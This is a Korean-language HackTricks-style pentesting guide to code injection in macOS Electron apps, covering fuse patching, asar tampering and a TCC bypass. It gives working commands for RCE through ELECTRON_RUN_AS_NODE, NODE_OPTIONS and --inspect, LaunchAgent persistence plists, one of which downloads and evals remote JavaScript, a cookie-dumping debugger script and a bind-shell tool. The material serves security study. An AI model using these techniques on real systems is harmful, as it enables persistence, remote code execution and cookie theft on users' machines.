# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Electron이 무엇인지 모른다면 [**여기에서 많은 정보를 찾을 수 있습니다**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). 하지만 지금은 Electron이 **node**를 실행한다는 것만 알면 됩니다.\
그리고 node에는 지정된 파일 외에 **다른 코드를 실행**하는 데 사용할 수 있는 **매개변수**와 **환경 변수**가 있습니다.

### Electron Fuses

이 기술들은 다음에 논의될 것이지만, 최근 Electron은 이를 방지하기 위해 여러 **보안 플래그**를 추가했습니다. 이것들이 바로 [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)이며, macOS에서 Electron 앱이 **임의의 코드를 로드하는 것을 방지**하는 데 사용되는 것들입니다:

- **`RunAsNode`**: 비활성화되면 코드 주입을 위해 env var **`ELECTRON_RUN_AS_NODE`**의 사용을 방지합니다.
- **`EnableNodeCliInspectArguments`**: 비활성화되면 `--inspect`, `--inspect-brk`와 같은 매개변수가 무시됩니다. 이를 통해 코드 주입을 피할 수 있습니다.
- **`EnableEmbeddedAsarIntegrityValidation`**: 활성화되면 로드된 **`asar`** **파일**이 macOS에 의해 **검증**됩니다. 이 파일의 내용을 수정하여 **코드 주입**을 방지합니다.
- **`OnlyLoadAppFromAsar`**: 이 옵션이 활성화되면 다음 순서로 로드하는 대신: **`app.asar`**, **`app`** 및 마지막으로 **`default_app.asar`**. 오직 app.asar만 확인하고 사용하므로, **`embeddedAsarIntegrityValidation`** 퓨즈와 결합할 때 **검증되지 않은 코드를 로드하는 것이 불가능**합니다.
- **`LoadBrowserProcessSpecificV8Snapshot`**: 활성화되면 브라우저 프로세스는 `browser_v8_context_snapshot.bin`이라는 파일을 V8 스냅샷으로 사용합니다.

코드 주입을 방지하지 않는 또 다른 흥미로운 퓨즈는:

- **EnableCookieEncryption**: 활성화되면 디스크의 쿠키 저장소가 OS 수준의 암호화 키를 사용하여 암호화됩니다.

### Checking Electron Fuses

애플리케이션에서 **이 플래그들을 확인할 수 있습니다**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron 퓨즈 수정

[**문서에서 언급한 바와 같이**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron 퓨즈**의 구성은 **Electron 바이너리** 내부에 설정되어 있으며, 그 안에는 문자열 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**가 포함되어 있습니다.

macOS 애플리케이션에서는 일반적으로 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`에 있습니다.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
이 파일을 [https://hexed.it/](https://hexed.it/)에서 로드하고 이전 문자열을 검색할 수 있습니다. 이 문자열 뒤에는 각 퓨즈가 비활성화되었는지 활성화되었는지를 나타내는 ASCII 숫자 "0" 또는 "1"이 표시됩니다. 헥스 코드를 수정하여(`0x30`은 `0`이고 `0x31`은 `1`) **퓨즈 값을 수정**할 수 있습니다.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

**`Electron Framework`** 바이너리를 이러한 바이트로 수정하여 애플리케이션 내에서 **덮어쓰려** 하면 앱이 실행되지 않습니다.

## RCE 전자 애플리케이션에 코드 추가

Electron 앱이 사용하는 **외부 JS/HTML 파일**이 있을 수 있으므로 공격자는 이러한 파일에 코드를 주입하여 서명이 확인되지 않고 앱의 컨텍스트에서 임의의 코드를 실행할 수 있습니다.

> [!CAUTION]
> 그러나 현재 2가지 제한 사항이 있습니다:
>
> - 앱을 수정하려면 **`kTCCServiceSystemPolicyAppBundles`** 권한이 **필요**하므로 기본적으로 더 이상 가능하지 않습니다.
> - 컴파일된 **`asap`** 파일은 일반적으로 퓨즈 **`embeddedAsarIntegrityValidation`** `및` **`onlyLoadAppFromAsar`** `가 활성화되어 있습니다.`
>
> 이로 인해 공격 경로가 더 복잡해지거나 불가능해집니다.

**`kTCCServiceSystemPolicyAppBundles`** 요구 사항을 우회하는 것이 가능하다는 점에 유의하십시오. 애플리케이션을 다른 디렉토리(예: **`/tmp`**)로 복사하고 폴더 **`app.app/Contents`**의 이름을 **`app.app/NotCon`**으로 바꾸고, **악성** 코드로 **asar** 파일을 **수정**한 다음 다시 **`app.app/Contents`**로 이름을 바꾸고 실행할 수 있습니다.

다음 명령어로 asar 파일에서 코드를 추출할 수 있습니다:
```bash
npx asar extract app.asar app-decomp
```
그리고 수정한 후 다시 패킹합니다:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**문서**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)에 따르면, 이 환경 변수가 설정되면 프로세스가 일반 Node.js 프로세스로 시작됩니다.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> 만약 퓨즈 **`RunAsNode`**가 비활성화되면 env var **`ELECTRON_RUN_AS_NODE`**는 무시되며, 이 방법은 작동하지 않습니다.

### 앱 Plist에서의 주입

[**여기에서 제안된 대로**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) 이 env 변수를 plist에서 악용하여 지속성을 유지할 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

페이로드를 다른 파일에 저장하고 실행할 수 있습니다:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> 만약 퓨즈 **`EnableNodeOptionsEnvironmentVariable`** 가 **비활성화** 되어 있다면, 앱은 env 변수 **NODE_OPTIONS** 를 무시하고 실행되며, env 변수 **`ELECTRON_RUN_AS_NODE`** 가 설정되지 않은 경우에도 마찬가지로 **무시** 됩니다. 퓨즈 **`RunAsNode`** 가 비활성화 되어 있다면, 이 변수도 **무시** 됩니다.
>
> **`ELECTRON_RUN_AS_NODE`** 를 설정하지 않으면, 다음과 같은 **오류** 가 발생합니다: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### 앱 Plist에서의 주입

이 env 변수를 plist에서 악용하여 지속성을 유지하기 위해 다음 키를 추가할 수 있습니다:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

[**이것**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)에 따르면, **`--inspect`**, **`--inspect-brk`** 및 **`--remote-debugging-port`**와 같은 플래그로 Electron 애플리케이션을 실행하면 **디버그 포트가 열리게** 되어 이를 연결할 수 있습니다(예: `chrome://inspect`의 Chrome에서) 그리고 **코드를 주입할 수** 있거나 심지어 새로운 프로세스를 시작할 수 있습니다.\
예를 들어:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> 만약 퓨즈 **`EnableNodeCliInspectArguments`**가 비활성화되어 있다면, 앱은 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되지 않는 한 실행 시 **node 매개변수**(예: `--inspect`)를 **무시**합니다. 또한 퓨즈 **`RunAsNode`**가 비활성화되어 있으면 이 변수도 **무시**됩니다.
>
> 그러나 여전히 **electron 매개변수 `--remote-debugging-port=9229`**를 사용할 수 있지만, 이전 페이로드는 다른 프로세스를 실행하는 데 작동하지 않습니다.

매개변수 **`--remote-debugging-port=9222`**를 사용하면 Electron 앱에서 **히스토리**(GET 명령어로)나 브라우저의 **쿠키**와 같은 일부 정보를 훔칠 수 있습니다(브라우저 내에서 **복호화**되며, 이를 제공하는 **json 엔드포인트**가 있습니다).

이 방법에 대해 배우려면 [**여기**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)와 [**여기**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)를 참조하고 자동 도구 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 또는 다음과 같은 간단한 스크립트를 사용할 수 있습니다:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
이 [**블로그 포스트**](https://hackerone.com/reports/1274695)에서는 이 디버깅을 악용하여 헤드리스 크롬이 **임의의 파일을 임의의 위치에 다운로드**하도록 합니다.

### 앱 Plist에서의 주입

이 env 변수를 plist에서 악용하여 지속성을 유지하기 위해 다음 키를 추가할 수 있습니다:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC 우회 구버전 악용

> [!TIP]
> macOS의 TCC 데몬은 실행된 애플리케이션의 버전을 확인하지 않습니다. 따라서 **이전 기술로 Electron 애플리케이션에 코드를 주입할 수 없는 경우** APP의 이전 버전을 다운로드하고 그 위에 코드를 주입할 수 있습니다. 그러면 여전히 TCC 권한을 받을 수 있습니다(Trust Cache가 이를 방지하지 않는 한).

## 비 JS 코드 실행

이전 기술을 사용하면 **Electron 애플리케이션의 프로세스 내에서 JS 코드를 실행할 수 있습니다**. 그러나 **자식 프로세스는 부모 애플리케이션과 동일한 샌드박스 프로필에서 실행되며** TCC 권한을 **상속받습니다**.\
따라서 카메라나 마이크에 접근하기 위해 권한을 악용하고 싶다면, **프로세스에서 다른 바이너리를 실행하면 됩니다**.

## 자동 주입

도구 [**electroniz3r**](https://github.com/r3ggi/electroniz3r)는 **취약한 Electron 애플리케이션**을 쉽게 찾아서 그 위에 코드를 주입하는 데 사용할 수 있습니다. 이 도구는 **`--inspect`** 기술을 사용하려고 시도합니다:

직접 컴파일해야 하며 다음과 같이 사용할 수 있습니다:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 참고 문헌

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
